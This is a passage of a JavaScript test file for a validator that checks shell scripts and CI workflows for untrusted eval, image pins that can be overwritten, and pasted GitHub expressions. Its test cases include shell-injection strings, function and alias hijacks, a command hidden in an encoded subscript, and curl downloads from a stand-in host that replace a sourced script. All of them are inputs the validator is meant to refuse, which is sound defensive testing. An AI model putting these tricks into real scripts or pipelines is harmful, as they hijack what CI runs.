  const output = '"$(bash infra/creds.sh tests)"';
  for (const assignment of [
    `comm""ands=${output}`,
    `"commands"=${output}`,
    `'commands'=${output}`,
    `comm\\ands=${output}`,
    `commands\\=${output}`,
    `commands"="${output}`,
    `commands'='${output}`,
  ])
    for (const body of [
      `${assignment}\neval "$commands"`,
      `commands=${PAYLOAD}\n${assignment}\neval "$commands"`,
      `export ${assignment}\neval "$commands"`,
    ])
      evalRefusedBoth(body);
});

test('FU-159 r3 F1: the genuine shapes stay accepted', () => {
  for (const body of [
    `${PRODUCER}\neval "$commands"`,
    `${PRODUCER}\neval "\${commands}"`,
    `${PRODUCER}\neval "$commands"''`,
    `export ${PRODUCER}\neval "$commands"`,
    `( ${PRODUCER} && eval "$commands" )`,
    `a_c="$(bash infra/creds.sh tests)"\nb_c="$(bash infra/creds.sh service x)"\neval "$a_c" && eval "$b_c"`,
  ])
    evalAcceptedBoth(body);
});

test('FU-159 r3 F2: every expansion site is a write site: here-strings, here-documents, redirection targets', () => {
  const payload = 'do""cker run alpine:latest';
  for (const operator of [':=', '=']) {
    for (const body of [
      `commands="$(bash infra/creds.sh invalid)"\n: <<<"\${commands${operator}${payload}}"\neval "$commands"`,
      `${PRODUCER}\n: <<<\${commands${operator}${payload}}\neval "$commands"`,
      `${PRODUCER}\n: <<EOF\n\${commands${operator}${payload}}\nEOF\neval "$commands"`,
      `${PRODUCER}\n: <<-EOF\n\t\${commands${operator}${payload}}\nEOF\neval "$commands"`,
      `${PRODUCER}\n: > "\${commands${operator}/dev/null}"\neval "$commands"`,
      `${PRODUCER}\n: < "\${commands${operator}/dev/null}"\neval "$commands"`,
    ])
      evalRefusedBoth(body);
  }
  // arithmetic that assigns, in either input form
  for (const body of [
    `${PRODUCER}\n: <<<"$((commands=5))"\neval "$commands"`,
    `${PRODUCER}\n: <<EOF\n$((commands=5))\nEOF\neval "$commands"`,
    `${PRODUCER}\n: <<EOF\n$[commands=5]\nEOF\neval "$commands"`,
  ])
    evalRefusedBoth(body);
  // a quoted here-document delimiter expands nothing
  evalAcceptedBoth(`${PRODUCER}\ncat <<'EOF'\n\${commands:=x}\nEOF\neval "$commands"`);
});

test('FU-159 r3 F2: arithmetic this check cannot prove constant never keeps a producer trusted', () => {
  // `n` holds the text `commands=42`: every arithmetic context below evaluates it, in this shell
  const data = `n="$(printf '\\143ommands=42')"`;
  for (const use of [
    ': $((n))',
    ': $[n]',
    ': "$((n))"',
    '(( n ))',
    '(( (n) ))',
    'for ((i=n;i<1;i++)); do :; done',
    '[[ n -eq 42 ]]',
    '[[ "$n" -eq 42 ]]',
    '[[ -n y && 5 -eq n ]]',
    '[[ -v other[n] ]]',
    'a=(1 2); : ${a[n]}',
    'a=(1); : ${#a[n]}',
    's=xy; : ${s:n}',
    's=xy; : ${s:0:n}',
    'a[n]=1',
    'a=([n]=1)',
    'declare -A m; m[n]=1',
    'declare -a other[n]',
    "typeset -a 'other[n]'",
    "read 'other[n]' <<<x",
    "printf -v 'other[n]' x",
    "unset 'other[n]'",
    "test -v 'other[n]'",
    "[ -v 'other[n]' ]",
    'let n',
    'let "n"',
    'declare -i q; q=n',
    'typeset -i q; q=n',
    'f() { local -i q; q=n; }; f',
    "eval ': $((n))'",
    "trap ': $((n))' EXIT",
  ])
    evalRefusedBoth(`${PRODUCER}\n${data}\n${use}\neval "$commands"`);
});

test('FU-159 r3 F2: expansions that assign or run through a name this check cannot read', () => {
  for (const use of [
    `r="$(printf '\\143ommands')"; : \${!r:=zz}`,
    'v=x; : "${v@P}"',
    `r="$(printf 'a[%s]' x)"; : "\${!r}"`,
    ': ${ x=1; }',
    "PS4='$((n))'; set -x; true",
    "PS4='${commands:=x}'; set -x; true",
    `mapfile -C 'comm""ands=x' -c 1 <<<y`,
    `mapfile -C'comm""ands=x' -c 1 <<<y`,
    `compgen -W '\${commands:=x}'`,
    'compgen -W "$n"',
  ])
    evalRefusedBoth(`${PRODUCER}\n${use}\neval "$commands"`);
});

test('FU-159 r3 F2: constant arithmetic, other names and literal subscripts leave the producer trusted', () => {
  for (const body of [
    `${PRODUCER}\n: $((1+2))\neval "$commands"`,
    `${PRODUCER}\nn=0\n(( n=5 ))\neval "$commands"`,
    `${PRODUCER}\na=(1 2)\n: "\${a[@]}" "\${a[0]}" "\${#a[@]}"\neval "$commands"`,
    `${PRODUCER}\ns=abcd\n: \${s:1:2}\neval "$commands"`,
    `${PRODUCER}\n[ "$x" -eq 1 ]\neval "$commands"`,
    `${PRODUCER}\ncat <<<"hello"\neval "$commands"`,
    `${PRODUCER}\ncat <<EOF\nhello \${x:-y}\nEOF\neval "$commands"`,
    `${PRODUCER}\n: \${x:-default}\neval "$commands"`,
    `${PRODUCER}\na=(1 2)\n: "\${!a[@]}" "\${!a[*]}" "\${!BASH*}"\neval "$commands"`,
    `foo() { :; }\n${PRODUCER}\neval "$commands"`,
  ])
    evalAcceptedBoth(body);
});

test('FU-159 r3 F3: the producer counts only when its interpreter cannot be a function or an alias', () => {
  const fn = (name) => `${name}() { printf '%s\\n' 'do""cker run alpine:latest'; }`;
  for (const body of [
    `${fn('bash')}\n${PRODUCER}\neval "$commands"`,
    `${fn('sh')}\ncommands="$(sh infra/creds.sh tests)"\neval "$commands"`,
    `function bash { printf '%s\\n' x; }\n${PRODUCER}\neval "$commands"`,
    `function bash() { printf '%s\\n' x; }\n${PRODUCER}\neval "$commands"`,
    `${fn('bash')}\ncommands="$("bash" infra/creds.sh tests)"\neval "$commands"`,
    `${fn('bash')}\ncommands="$(\\bash infra/creds.sh tests)"\neval "$commands"`,
    `${fn('bash')}\ncommands="$(ba""sh infra/creds.sh tests)"\neval "$commands"`,
    `"bash"() { printf '%s\\n' x; }\n${PRODUCER}\neval "$commands"`,
    `eval 'bash() { printf "%s\\n" x; }'\n${PRODUCER}\neval "$commands"`,
    `eval "bash() { printf '%s\\n' x; }"\n${PRODUCER}\neval "$commands"`,
    `trap 'bash() { :; }' EXIT\n${PRODUCER}\neval "$commands"`,
    `${PRODUCER}\n${fn('bash')}\neval "$commands"`,
    `shopt -s expand_aliases\nalias bash='printf "%s\\n" x;:'\n${PRODUCER}\neval "$commands"`,
    `BASH_ALIASES[bash]=x\n${PRODUCER}\neval "$commands"`,
    // the same shell reached through a command substitution or a here-document
    `${fn('bash')}\nx="$( ${PRODUCER}; eval "$commands" )"`,
    `${fn('bash')}\nbash <<'EOF'\n${PRODUCER}\neval "$commands"\nEOF`,
    `alias bash=true\nx="$( ${PRODUCER}; eval "$commands" )"`,
  ])
    evalRefusedBoth(body);
  // a definition the splitter does not see at the head of a command is still refused (the shell
  // word has nothing to run), not trusted
  for (const body of [
    `if true; then ${fn('bash')}; fi\n${PRODUCER}\neval "$commands"`,
    `( ${fn('bash')} )\n${PRODUCER}\neval "$commands"`,
  ])
    for (const kind of ['shell', 'workflow'])
      assert.notDeepEqual(
        validateInfraImagePins([credsFile, asInput(kind, body)], creds150).errors,
        [],
        body,
      );
  // a function of another name, and the plain shapes, leave the producer trusted
  for (const body of [
    `${fn('other')}\n${PRODUCER}\neval "$commands"`,
    `commands="$(sh infra/creds.sh tests)"\neval "$commands"`,
  ])
    evalAcceptedBoth(body);
});

// --- FU-196 + FU-202 (task 363): provenance is PROVEN, never read off the last visible assignment ---------------

test('FU-202 R1: an assignment-like command name, a shadowed or failing declarer never binds the producer', () => {
  const payload = 'do""cker run alpine:latest';
  const run = (name) => `commands="$(${name} bash infra/creds.sh invalid)"`;
  for (const name of ['"x=x"', 'x""=x', '"x"=x', "x'='x", 'x\\=x', "'x=x'", '\\x=x'])
    evalRefusedBoth(
      `function x=x { printf '%s\\n' '${payload}'; }\n${run(name)}\neval "$commands"`,
    );
  for (const declarer of ['export', 'declare', 'readonly', 'typeset']) {
    const set = `commands="$(bash infra/creds.sh invalid)"`;
    for (const body of [
      `${declarer}() { :; }\n${declarer} ${set}\neval "$commands"`,
      `eval '${declarer}() { :; }'\n${declarer} ${set}\neval "$commands"`,
      `function ${declarer} { :; }\n${declarer} ${set}\neval "$commands"`,
      `${declarer}() { :; }\n"${declarer}" ${set}\neval "$commands"`,
      `\\${declarer} ${set}\neval "$commands"`,
    ])
      evalRefusedBoth(body);
  }
  for (const body of [
    `local() { :; }\nlocal ${PRODUCER}\neval "$commands"`,
    // `local` outside a function fails and assigns nothing; inside one the name dies with the call
    `local ${PRODUCER}\neval "$commands"`,
    `set +e\nlocal ${PRODUCER}\neval "$commands"`,
    `f() {\n  local ${PRODUCER}\n  eval "$commands"\n}\nf`,
    `shopt -s expand_aliases\nalias export=:\nexport ${PRODUCER}\neval "$commands"`,
    `export -n ${PRODUCER}\neval "$commands"`,
    `declare -n ${PRODUCER}\neval "$commands"`,
    `command export ${PRODUCER}\neval "$commands"`,
    `: export ${PRODUCER}\neval "$commands"`,
  ])
    evalRefusedBoth(body);
  for (const body of [
    `export ${PRODUCER}\neval "$commands"`,
    `readonly ${PRODUCER}\neval "$commands"`,
    `declare ${PRODUCER}\neval "$commands"`,
    `typeset ${PRODUCER}\neval "$commands"`,
    `commands="$(FOO=1 bash infra/creds.sh tests)"\neval "$commands"`,
    `foo() { :; }\nexport ${PRODUCER}\neval "$commands"`,
    `f() {\n  local x=1\n}\n${PRODUCER}\neval "$commands"`,
  ])
    evalAcceptedBoth(body);
});

// FU-202 R2: every redirection is an expansion site, whoever owns it.
test('FU-202 R2: an earlier here-string, a here-document or here-string of a command with no words writes too', () => {
  const payload = 'do""cker run alpine:latest';
  const E = 'eval "$commands"';
  for (const body of [
    `commands="$(bash infra/creds.sh invalid)"\n: <<<"\${commands:=${payload}}" <<<hello\n${E}`,
    `${PRODUCER}\n: <<<"\${commands=${payload}}" <<<hello\n${E}`,
    `${PRODUCER}\n: <<<"$((commands=5))" <<<hello\n${E}`,
    `${PRODUCER}\n: <<<"$((n))" <<<hello\n${E}`,
    `${PRODUCER}\n: <<<"\${commands:=x}" <<<a <<<b\n${E}`,
    `${PRODUCER}\n: <<<"\${commands:=x}" <<EOF\nhello\nEOF\n${E}`,
    `${PRODUCER}\n<<<"\${commands:=x}"\n${E}`,
    `${PRODUCER}\n<<<"\${commands:=x}" <<<y\n${E}`,
    `${PRODUCER}\n<<EOF\n\${commands:=${payload}}\nEOF\n${E}`,
    `${PRODUCER}\n<<-EOF\n\t\${commands:=${payload}}\nEOF\n${E}`,
    `${PRODUCER}\n<<EOF\n$((commands=5))\nEOF\n${E}`,
    `${PRODUCER}\n<<EOF >/dev/null\n\${commands:=x}\nEOF\n${E}`,
    `${PRODUCER}\n: <<A <<B\nhello\nA\n\${commands:=x}\nB\n${E}`,
    `${PRODUCER}\n<<A <<B\nhello\nA\n\${commands:=x}\nB\n${E}`,
    `${PRODUCER}\n3<<EOF\n\${commands:=x}\nEOF\n${E}`,
    `${PRODUCER}\n{ <<EOF\n\${commands:=x}\nEOF\n}\n${E}`,
    `${PRODUCER}\n<<EOF | cat\n\${commands:=x}\nEOF\n${E}`,
    `${PRODUCER}\n> "\${commands:=/dev/null}"\n${E}`,
    `${PRODUCER}\n2> "\${commands:=/dev/null}"\n${E}`,
    `${PRODUCER}\n>&"\${commands:=2}"\n${E}`,
    `${PRODUCER}\n( : <<<"\${commands:=x}" <<<y )\n${E}`,
    `${PRODUCER}\ncat <<<"\${commands:=x}" <<<y | cat\n${E}`,
  ])
    evalRefusedBoth(body);
  for (const body of [
    `${PRODUCER}\ncat <<<a <<<b\n${E}`,
    `${PRODUCER}\n<<EOF\nhello\nEOF\n${E}`,
    `${PRODUCER}\n<<'EOF'\n\${commands:=x}\nEOF\n${E}`,
  ])
    evalAcceptedBoth(body);
});

test('FU-202 R2: test -v / -R and [[ -v ]] name a variable by text, which bash evaluates as a subscript', () => {
  const n = `n="$(printf 'other[\\044\\050do""cker run alpine:latest >&2; printf 0\\051]')"`;
  for (const use of [
    'test -v "$n"',
    '[ -v "$n" ]',
    '[[ -v "$n" ]]',
    '[[ -v $n ]]',
    'builtin test -v "$n"',
    'command test -v "$n"',
    'builtin [ -v "$n" ]',
    'command [ -v "$n" ]',
    'test ! -v "$n"',
    'test -n x -a -v "$n"',
    '[ -v other[$n] ]',
    '[[ -n x && -v "$n" ]]',
    '[[ -z x || -v "$n" ]]',
    'test -R "$n"',
    '[[ -R "$n" ]]',
    'time test -v "$n"',
    '! test -v "$n"',
    'test -v "$(printf x)"',
    'test -v "${n:-x}"',
  ]) {
    // as the provenance of an evaluated output
    evalRefusedBoth(`${PRODUCER}\n${n}\n${use}\neval "$commands"`);
    // and on its own: there may be nothing to evaluate but the command it runs
    refusesWhy(`${n}\n${use}`, /test -v \/ -R .* computed text/);
  }
  for (const body of [
    `${PRODUCER}\ntest -v HOME\neval "$commands"`,
    `${PRODUCER}\n[[ -v HOME ]]\neval "$commands"`,
    `${PRODUCER}\n[ -v HOME ]\neval "$commands"`,
    `${PRODUCER}\ntest -n "$x"\neval "$commands"`,
    `${PRODUCER}\n[ -z "$x" ]\neval "$commands"`,
    `${PRODUCER}\n[[ -f "$x" ]]\neval "$commands"`,
    `${PRODUCER}\ngrep -v "$x" /dev/null\neval "$commands"`,
  ])
    evalAcceptedBoth(body);
});

// --- task 367 (FU-224): an image or program word takes ONE small form; every other expansion refuses -----------
// READONLY_FORM (lib header of preambleLiterals): `set -euo pipefail` and `readonly NAME=<literal>` (NAME ends in
// IMAGE or BIN) are the only commands before the first other one; the name is read only as the whole word "$NAME".

const PIN = `alpine:3@${A}`;
const FORM =
  /image .* (?:names \w+, which is no preamble readonly literal|has an expansion|has an unquoted or vector expansion|is a command substitution)|has the expansion .* before its image/;
const imageRefused = (body, why = FORM, policy = bare, extra = []) =>
  refusesWhy(body, why, policy, extra);
const decl = (name = 'X_IMAGE', value = PIN) => `set -euo pipefail\nreadonly ${name}=${value}\n`;

test('task 367: the allowed forms - a literal, ${{ env.NAME }}, or "$NAME" of a preamble readonly literal', () => {
  acceptsBoth(`docker run ${PIN} true`);
  acceptsBoth(`${decl()}docker run "$X_IMAGE" true`);
  acceptsBoth(`${decl()}docker run "\${X_IMAGE}" true`);
  // later reads: a function, a loop, a subshell, a substitution
  acceptsBoth(`${decl()}f() { docker run --rm "$X_IMAGE" true; }\nf`);
  acceptsBoth(`${decl()}for i in 1 2; do docker run "$X_IMAGE" "$i"; done`);
  acceptsBoth(`${decl()}( docker run "$X_IMAGE" true )\nx="$(docker run "$X_IMAGE" true)"`);
  // the container's own command may be any words, vectors included
  acceptsBoth(`${decl()}f() { docker run -e A=b "$X_IMAGE" -C /tmp "$@"; }\nf`);
  // the same form names an executed program
  const lib = scriptFile('scripts/lib.sh');
  const policy = {
    ...bare,
    executedPrograms: new Map([
      ['scripts/x.sh', { words: ['${TOOL_BIN}/scripts/lib.sh'], reason: 'r' }],
    ]),
  };
  acceptsShell(`${decl('TOOL_BIN', '/r')}"\${TOOL_BIN}/scripts/lib.sh"`, policy, [lib]);
  // a workflow step reads its pinned env through the expression GitHub pastes in
  const env = { env: { MINIO_IMAGE: PIN } };
  assert.deepEqual(
    infra([workflow('docker run -d "${{ env.MINIO_IMAGE }}" server', env)]).errors,
    [],
  );
  // Task 368 F3: an unquoted paste is zero or several words; only the quoted form is one word
  assert.match(
    infra([workflow('docker run -d ${{ env.MINIO_IMAGE }} server', env)]).errors.join('\n'),
    /has an unquoted or vector expansion/,
  );
});

test('task 367: any other spelling of an image refuses, with the line and the fix', () => {
  const env = { env: { MINIO_IMAGE: PIN } };
  // the step env read as a shell variable: no proof, so no trust (the ci.yml shape of before)
  const { errors } = infra([workflow('docker run -d "$MINIO_IMAGE" server', env)]);
  assert.match(
    errors[0],
    /\.github\/workflows\/ci\.yml:\d+: image \$MINIO_IMAGE names MINIO_IMAGE, which is no preamble readonly literal; write the reference literally/,
  );
  for (const body of [
    'docker run $X_IMAGE true', // unquoted: bash splits it
    `${decl()}docker run $X_IMAGE true`,
    `${decl()}docker run "$X_IMAGE"x true`,
    `${decl()}docker run "\${X_IMAGE:-${PIN}}" true`,
    `${decl()}docker run "\${X_IMAGE%%@*}" true`,
    `${decl()}docker run "$(echo ${PIN})" true`,
    `${decl()}docker run "$X_IMAGE""" true`,
    `${decl()}docker run "$X_IMAGE"$Y true`,
    `X_IMAGE=${PIN}\ndocker run "$X_IMAGE" true`, // a plain assignment is no freeze
    `X_IMAGE=${PIN}\nreadonly X_IMAGE\ndocker run "$X_IMAGE" true`,
    `export X_IMAGE=${PIN}\ndocker run "$X_IMAGE" true`,
    `${decl('IMG')}docker run "$IMG" true`, // the name does not end in IMAGE or BIN
    `set -euo pipefail\nreadonly X_IMAGE="$Y"\ndocker run "$X_IMAGE" true`,
    `set -euo pipefail\nreadonly X_IMAGE=$(cat f)\ndocker run "$X_IMAGE" true`,
    `set -euo pipefail\nreadonly X_IMAGE="\${Y:-${PIN}}"\ndocker run "$X_IMAGE" true`,
    `set -euo pipefail\nreadonly X_IMAGE=${PIN} Y_IMAGE=${PIN}\ndocker run "$X_IMAGE" true`,
    `set -euo pipefail\nreadonly -- X_IMAGE=${PIN}\ndocker run "$X_IMAGE" true`,
  ])
    imageRefused(body);
});

test('task 367: the declaration is the preamble - nothing else may run, branch, repeat or hide before it', () => {
  const read = 'docker run "$X_IMAGE" true';
  const set = `readonly X_IMAGE=${PIN}`;
  for (const body of [
    `true\n${set}\n${read}`,
    `echo hi\n${set}\n${read}`,
    `f() { :; }\n${set}\n${read}`,
    `${set}\n${set}\n${read}`, // the second declaration fails: the name has no literal
    `if true; then ${set}; fi\n${read}`,
    `true && ${set}\n${read}`,
    `${set} &\n${read}`,
    `${set} | cat\n${read}`,
    `( ${set} )\n${read}`,
    `{ ${set}; }\n${read}`,
    `${set} 2>/dev/null\n${read}`,
    `${set} <<<x\n${read}`,
    `"readonly" X_IMAGE=${PIN}\n${read}`,
    `readonly() { :; }\n${set}\n${read}`,
    `command readonly X_IMAGE=${PIN}\n${read}`,
    `declare -r X_IMAGE=${PIN}\n${read}`,
    `typeset -r X_IMAGE=${PIN}\n${read}`,
    `set +e\n${set}\n${read}`,
    `set -a\n${set}\n${read}`,
    `f() { ${set}; ${read}; }\nf`,
    `bash -c '${set}'\n${read}`,
    // a different shell does not have the name
    `${set}\nbash -c '${read}'`,
    `${set}\nsh -c "${read}"`,
  ])
    imageRefused(
      body,
      /image .* names X_IMAGE|has an expansion|is a command substitution|not .* unconditional|does not read|runs a body this check cannot read/,
    );
  // FU-200 F4: `readonly X &`, `readonly X | cat` and a shadowed `readonly` prove nothing
  imageRefused(`readonly X_IMAGE=${PIN} &\nX_IMAGE=alpine:latest\n${read}`);
  imageRefused(`readonly() { :; }\nreadonly X_IMAGE=${PIN}\nX_IMAGE=alpine:latest\n${read}`);
  // a function of the outer shell answers `readonly` and `set` inside a substitution too
  imageRefused(`readonly() { :; }\nx="$(set -euo pipefail; readonly X_IMAGE=${PIN}\n${read})"`);
  imageRefused(`set() { :; }\nx="$(set -euo pipefail; readonly X_IMAGE=${PIN}\n${read})"`);
  // the name is not read before its declaration
  imageRefused(`f() { ${read}; }\n${set}\nf`, /names X_IMAGE|before its declaration|no preamble/);
});

test('task 367 R1 (PR-927): an overwritten image variable cannot pass through superseded or commandless here-strings', () => {
  const probe = `IMG_IMAGE=${PIN}\nprintf -v ref '%s%s' IM G_IMAGE=5\n: <<<"$((ref))" <<<x\ndocker run "$IMG_IMAGE"`;
  imageRefused(probe);
  imageRefused(`IMG_IMAGE=${PIN}\n: <<<"\${IMG_IMAGE:=alpine:latest}"\ndocker run "$IMG_IMAGE"`);
  imageRefused(`IMG_IMAGE=${PIN}\n<<<"\${IMG_IMAGE:=alpine:latest}"\ndocker run "$IMG_IMAGE"`);
  imageRefused(
    `IMG_IMAGE=${PIN}\ncat <<<a <<<"\${IMG_IMAGE:=alpine:latest}"\ndocker run "$IMG_IMAGE"`,
  );
  // bash agrees with the one form: a write to a readonly name fails, so the declared value is the one that runs
  acceptsBoth(
    `${decl('IMG_IMAGE')}printf -v ref '%s%s' IM G_IMAGE=5\n: <<<"$((ref))" <<<x\ndocker run "$IMG_IMAGE"`,
  );
});

test('task 367 R2 (PR-927): bash-managed names are never an image or program value', () => {
  for (const name of [
    'FUNCNAME',
    'COPROC_PID',
    'COPROC',
    'POSIXLY_CORRECT',
    'BASH_REMATCH',
    'BASHPID',
    'REPLY',
    'MAPFILE',
    'OPTARG',
    'RANDOM',
    'SECONDS',
    'PIPESTATUS',
    'LINENO',
    'IFS',
    'PATH',
    '_',
  ])
    imageRefused(
      `set -euo pipefail\nreadonly ${name}=${PIN}\nalpine() { docker run "$${name}" true; }\nalpine`,
    );
  // a coprocess writes NAME_PID; the declaration of a name ending in IMAGE or BIN is not one bash writes
  imageRefused(`COPROC_PID=${PIN}\ncoproc { sleep 1; }\ndocker run "$COPROC_PID" true`);
  refusesWhy('coproc IMAGE { sleep 1; }', /coproc writes NAME_PID/);
  refusesWhy('coproc { sleep 1; }', /coproc writes NAME_PID/);
  const lib = scriptFile('scripts/lib.sh');
  const policy = {
    ...bare,
    executedPrograms: new Map([
      ['scripts/x.sh', { words: ['${FUNCNAME}/scripts/lib.sh'], reason: 'r' }],
    ]),
  };
  refusesWhy(
    'set -euo pipefail\nreadonly FUNCNAME=/r\nf() { "${FUNCNAME}/scripts/lib.sh"; }\nf',
    /does not read/,
    policy,
    [lib],
  );
  refusesWhy(
    'set +o posix\nreadonly POSIXLY_CORRECT=/r\n"${POSIXLY_CORRECT}/scripts/lib.sh"',
    /does not read/,
    policy,
    [lib],
  );
});

test('task 367 R3 (PR-927): quote removal never changes which variable an image word names', () => {
  const body = (value) =>
    `AB=${PIN}\nA=alpine:latest\nreadonly X_IMAGE=${value}\ndocker run "$X_IMAGE" true`;
  for (const value of ['"$A""B"', '"$A"B', '$A"B"', '"${A}"B', "$A''B", '$A\\B', '"$A"\'B\''])
    imageRefused(body(value));
  for (const word of ['"$A""B"', '"$A"B', '$A""', '"$A"$B', '"${A}B"'])
    imageRefused(`AB=${PIN}\nA=alpine:latest\ndocker run ${word} true`);
});

test('task 367 R4 (PR-927): a quoted vector expansion cannot shift the image or the program', () => {
  const PINW = PIN;
  for (const vector of [
    '"$@"',
    '"${@}"',
    '"${@:2}"',
    '"${@:1:1}"',
    '"${arr[@]}"',
    '"${arr[@]:1}"',
    '"${!pre@}"',
    '"${!ref}"',
    'x"$@"',
    '"$@"x',
  ])
    imageRefused(
      `set -- a=b alpine:latest\narr=(a=b alpine:latest)\ndocker run -e ${vector} ${PINW}`,
      /has the expansion .* before its image/,
    );
  imageRefused(
    `flags=(-e a=b alpine:latest)\ndocker run "\${flags[@]}" ${PINW}`,
    /has the expansion .* before its image|has an unquoted or vector expansion/,
  );
  imageRefused(
    `flags=(alpine:latest)\ndocker run "\${flags[@]}"`,
    /has the expansion .* before its image|has an unquoted or vector expansion/,
  );
  imageRefused('docker run "${flags[@]}" "${IMGS[@]}"');
  // a wrapper's operand list is part of the program position
  for (const wrapper of [
    'timeout',
    'env',
    'nice',
    'ionice',
    'stdbuf',
    'sudo',
    'doas',
    'flock',
    'chroot',
    'exec',
    'time',
  ])
    refusesWhy(
      `set -- sleep 1\n${wrapper} "$@" sleep 1`,
      /expands to an unknown number of words|cannot read|does not model/,
    );
  refusesWhy('set -- sleep 1\nfind "$@"', /find builds command lines/);
  // single quotes are literal; a vector AFTER the image is the container's argument list
  acceptsBoth(`docker run -e '$@' ${PINW} true`);
  acceptsBoth(`f() { docker run ${PINW} "$@"; }\nf`);
});

test('task 367 (FU-200 F1): a GitHub expression is shell text pasted before parsing; only a plain env value is read', () => {
  // the review's probe: CMD closes the quote, ends the command and starts a docker run
  const injected = { env: { CMD: '"; do""cker run alpine:latest #' } };
  const { errors } = infra([workflow('echo "${{ env.CMD }}"', injected)]);
  assert.ok(
    errors.some((e) =>
      /ci\.yml:\d+: \$\{\{ env\.CMD \}\} is pasted into the script before the shell parses it/.test(
        e,
      ),
    ),
    errors.join('\n'),
  );
  for (const expression of [
    'github.event.pull_request.title',
    'github.head_ref',
    'matrix.cmd',
    'secrets.X',
    'env.NOT_SET',
    'env.A || env.B',
  ])
    assert.ok(
      infra([workflow(`echo "\${{ ${expression} }}"`, { env: { A: 'x' } })]).errors.some((e) =>
        /pasted into the script/.test(e),
      ),
      expression,
    );
  for (const value of [
    'a b',
    'a;b',
    'a"b',
    "a'b",
    'a$b',
    'a`b',
    'a\nb',
    'a|b',
    'a&b',
    'a>b',
    'a#b',
    'a\\b',
    'a*b',
  ])
    assert.ok(
      infra([workflow('echo ${{ env.V }}', { env: { V: value } })]).errors.some((e) =>
        /pasted into the script/.test(e),
      ),
      JSON.stringify(value),
    );
  assert.deepEqual(
    infra([workflow('echo "${{ env.V }}"', { env: { V: `quay.io/x:1@${A}` } })]).errors,
    [],
  );
  // an expression is the WHOLE image word: a shell expansion beside it can change what it names
  assert.ok(
    infra([workflow('docker run "${{ env.V }}$SUFFIX" true', { env: { V: PIN } })]).errors.some(
      (e) => /mixes a GitHub expression with a shell expansion/.test(e),
    ),
  );
});

test('task 367 (FU-200 F1): a reviewed program does not get the option that runs a program of its own', () => {
  const reviewed = (programs) => ({
    ...bare,
    reviewedPrograms: new Map([['scripts/x.sh', { programs, reason: 'literal filter' }]]),
  });
  refusesShell(
    'sort --compress-program=tools/unchecked <<<b',
    /sort --compress-program runs a program/,
    reviewed(['sort']),
  );
  refusesShell(
    'sort --compress-program tools/unchecked <<<b',
    /sort --compress-program runs a program/,
    reviewed(['sort']),
  );
  acceptsShell('sort -u <<<b', reviewed(['sort']));
});

test('task 367 (FU-200 F1): with the whole tree read (complete), a listed file that is missing is an error', () => {
  const policy = {
    ...bare,
    complete: true,
    reviewedPrograms: new Map([['infra/gone.sh', { programs: ['awk'], reason: 'r' }]]),
    executedPrograms: new Map([['infra/gone2.sh', { words: ['${A_BIN}/x'], reason: 'r' }]]),
    evaluatedOutputs: new Map([['infra/gone3.sh', 'r']]),
    sourcedLibraries: new Map([['infra/gone.bash', { sha256: 'x', reason: 'r', functions: [] }]]),
  };
  const { errors } = validateInfraImagePins([scriptFile('scripts/x.sh', 'true')], policy);
  for (const [table, name] of [
    ['REVIEWED_PROGRAMS', 'infra/gone.sh'],
    ['EXECUTED_PROGRAMS', 'infra/gone2.sh'],
    ['EVALUATED_OUTPUTS', 'infra/gone3.sh'],
    ['SOURCED_LIBRARIES', 'infra/gone.bash'],
  ])
    assert.ok(
      errors.includes(`${table} lists ${name}, which was not found among the files read`),
      `${table}: ${errors.join('\n')}`,
    );
  assert.deepEqual(
    validateInfraImagePins([scriptFile('scripts/x.sh', 'true')], {
      ...policy,
      complete: false,
    }).errors.filter((e) => /not found among/.test(e)),
    [],
  );
});

test('task 367 (FU-200 F2): a source grants or removes functions only as an unconditional top-level command', () => {
  const defs = scriptFile('scripts/defs.sh', 'taskset() { :; }');
  const unsetter = scriptFile('scripts/unset.sh', 'unset -f taskset');
  const early = scriptFile('scripts/early.sh', 'return 0\ntaskset() { :; }');
  const hit = /taskset|source of a file that defines or unsets functions|does not model/;
  const call = '\ntaskset 1 tools/unchecked';
  acceptsShell(`source scripts/defs.sh${call}`, bare, [defs]); // the control: an import at the top level
  for (const body of [
    `source scripts/defs.sh &${call}`,
    `source scripts/defs.sh | cat${call}`,
    `. scripts/defs.sh &${call}`,
    `if true; then source scripts/defs.sh; fi${call}`,
    `true && source scripts/defs.sh${call}`,
    `( source scripts/defs.sh )${call}`,
    `f() { source scripts/defs.sh; }\nf${call}`,
    `eval 'source scripts/defs.sh'${call}`,
  ])
    refusesShell(body, hit, bare, [defs]);
  // a file that returns before its definition promises nothing
  refusesShell(`source scripts/early.sh${call}`, hit, bare, [early]);
  // a source that unsets: conditional, in a function body, or in an eval, it is not ordered
  for (const body of [
    `f() { :; }\nif true; then source scripts/unset.sh; fi\nf`,
    `taskset() { :; }\ng() { source scripts/unset.sh; }\ng${call}`,
    `taskset() { :; }\neval 'source scripts/unset.sh'${call}`,
    `taskset() { :; }\nsource scripts/unset.sh &${call}`,
    `taskset() { :; }\nsource scripts/unset.sh | cat${call}`,
  ])
    refusesShell(
      body,
      /source of a file that defines or unsets|does not model|eval runs text|does not read/,
      bare,
      [unsetter],
    );
});

test('task 367 (FU-200 F4): eval, nameref, curl, cp/mv and find cannot move, replace or redirect what runs', () => {
  const lib = scriptFile('scripts/lib.sh');
  refusesShell(
    'eval cd /other/checkout\nsource scripts/lib.sh',
    /eval runs text this check does not read/,
    bare,
    [lib],
  );
  refusesShell('eval "cd /other"', /eval runs text this check does not read/);
  for (const body of [
    'declare -n n=PATH\nn=tools\ncat',
    'declare -n n=BASH_ENV\nn=x.sh\nbash scripts/lib.sh',
    'typeset -n n=PATH',
    'local -n n=PATH',
    'declare -nr n=PATH',
    'export -n n',
    'declare -n n=IMG_IMAGE',
  ])
    refusesWhy(
      body,
      /-n makes a name reference|not .* unconditional|nameref|does not model|does not read/,
    );
  for (const writer of [
    'curl -oscripts/lib.sh http://x',
    'curl -sSoscripts/lib.sh http://x',
    'curl -fsSo scripts/lib.sh http://x',
    'curl -Dscripts/lib.sh http://x',
    'curl -cscripts/lib.sh http://x',
    'curl --config c.conf http://x',
    'curl -K c.conf http://x',
    'curl --libcurl scripts/lib.sh http://x',
    'curl --output scripts/lib.sh http://x',
    'curl --output=scripts/lib.sh http://x',
    'curl -O http://x/lib.sh',
    'curl http://x --next -o scripts/lib.sh http://y',
  ])
    refusesShell(
      `${writer}\nsource scripts/lib.sh`,
      /writes scripts\/lib\.sh|cannot read in a script that also sources|curl option/,
      bare,
      [lib],
    );
  for (const writer of [
    'cp tools/evil.sh scripts/',
    'cp tools/evil.sh scripts',
    'mv tools/evil.sh scripts/',
